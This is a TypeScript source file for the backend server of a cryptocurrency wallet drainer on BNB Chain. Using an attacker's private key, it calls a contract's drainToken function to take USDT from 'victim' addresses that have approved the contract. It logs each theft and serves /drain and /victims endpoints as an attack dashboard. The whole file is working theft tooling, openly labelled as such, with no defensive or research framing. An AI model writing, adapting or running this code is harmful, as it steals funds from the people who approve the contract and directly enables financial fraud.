import { ethers } from 'ethers';
import express, { Request, Response } from 'express';
import dotenv from 'dotenv';

// Load environment variables
dotenv.config();

// ============================================
// TYPES
// ============================================

interface Victim {
  address: string;
  amount: string;
  timestamp: string;
  txHash: string;
}

interface DrainRequest {
  victimAddress: string;
}

// ============================================
// CONFIGURATION (from .env)
// ============================================

const CONTRACT_ADDRESS: string = process.env.CONTRACT_ADDRESS || '';
const HACKER_WALLET: string = process.env.HACKER_WALLET || '';
const HACKER_PRIVATE_KEY: string = process.env.HACKER_PRIVATE_KEY || '';
const RPC_URL: string =
  process.env.RPC_URL || 'https://bsc-dataseed.binance.org/';
const PORT: number = parseInt(process.env.PORT || '3000');
const USDT_ADDRESS: string =
  process.env.USDT_ADDRESS || '0x55d398326f99059fF775485246999027B3197955';

// Validation - check if required env vars are set
if (!CONTRACT_ADDRESS || !HACKER_WALLET || !HACKER_PRIVATE_KEY) {
  console.error('❌ ERROR: Missing required environment variables!');
  console.error('Please check your .env file has:');
  console.error('  - CONTRACT_ADDRESS');
  console.error('  - HACKER_WALLET');
  console.error('  - HACKER_PRIVATE_KEY');
  process.exit(1);
}

// ============================================
// SETUP
// ============================================

// Connect to BNB Chain
const provider = new ethers.JsonRpcProvider(RPC_URL);

// Create wallet for signing transactions
const hackerWallet = new ethers.Wallet(HACKER_PRIVATE_KEY, provider);

// Contract ABI (simplified)
const CONTRACT_ABI = [
  'function drainToken(address tokenAddress, address victimAddress) external',
];

// Connect to your deployed contract
const contract = new ethers.Contract(
  CONTRACT_ADDRESS,
  CONTRACT_ABI,
  hackerWallet,
);

// Create web server for dashboard
const app = express();
app.use(express.json());

// Store victims
const victims: Victim[] = [];

// ============================================
// MONITOR FOR APPROVALS
// ============================================

// Simple token ABI to check balances
const TOKEN_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

const usdtContract = new ethers.Contract(USDT_ADDRESS, TOKEN_ABI, provider);

// Function to drain a victim
async function drainVictim(victimAddress: string): Promise<void> {
  console.log(`\n💀 DRAINING: ${victimAddress}`);

  try {
    // Check victim's USDT balance
    const balance: bigint = await usdtContract.balanceOf(victimAddress);
    const readableBalance: string = ethers.formatUnits(balance, 18);

    console.log(`   Balance: ${readableBalance} USDT`);

    if (balance > 0) {
      // Call your contract to drain
      const tx = await contract.drainToken(USDT_ADDRESS, victimAddress);
      console.log(`   Transaction: https://bscscan.com/tx/${tx.hash}`);

      await tx.wait();
      console.log(`   ✅ DRAINED ${readableBalance} USDT`);

      // Record victim
      victims.push({
        address: victimAddress,
        amount: readableBalance,
        timestamp: new Date().toISOString(),
        txHash: tx.hash,
      });
    } else {
      console.log(`   No USDT to drain`);
    }
  } catch (error) {
    const errorMessage =
      error instanceof Error ? error.message : 'Unknown error';
    console.log(`   ❌ Failed: ${errorMessage}`);
  }
}

// ============================================
// MANUAL DRAIN (for testing)
// ============================================

app.post(
  '/drain',
  async (req: Request<{}, {}, DrainRequest>, res: Response) => {
    const { victimAddress } = req.body;

    if (!victimAddress) {
      return res.status(400).json({ error: 'victimAddress required' });
    }

    console.log(`\n📝 Manual drain requested for: ${victimAddress}`);
    await drainVictim(victimAddress);

    res.json({ success: true, message: 'Drain executed' });
  },
);

// ============================================
// DASHBOARD
// ============================================

app.get('/victims', (req: Request, res: Response) => {
  res.json({
    totalVictims: victims.length,
    victims: victims,
    hackerWallet: HACKER_WALLET,
    contract: CONTRACT_ADDRESS,
  });
});

app.get('/status', (req: Request, res: Response) => {
  res.json({
    status: 'running',
    contract: CONTRACT_ADDRESS,
    hackerWallet: HACKER_WALLET,
    victimsDrained: victims.length,
    network: 'BNB Chain',
    rpc: RPC_URL,
  });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, () => {
  console.log('\n' + '='.repeat(50));
  console.log('💀 DRAINER BACKEND RUNNING 💀');
  console.log('='.repeat(50));
  console.log(`Contract: ${CONTRACT_ADDRESS}`);
  console.log(`Hacker Wallet: ${HACKER_WALLET}`);
  console.log(`Dashboard: http://localhost:${PORT}/victims`);
  console.log(`Status: http://localhost:${PORT}/status`);
  console.log('='.repeat(50) + '\n');
  console.log('⚠️ Waiting for victims to approve the contract...\n');
});
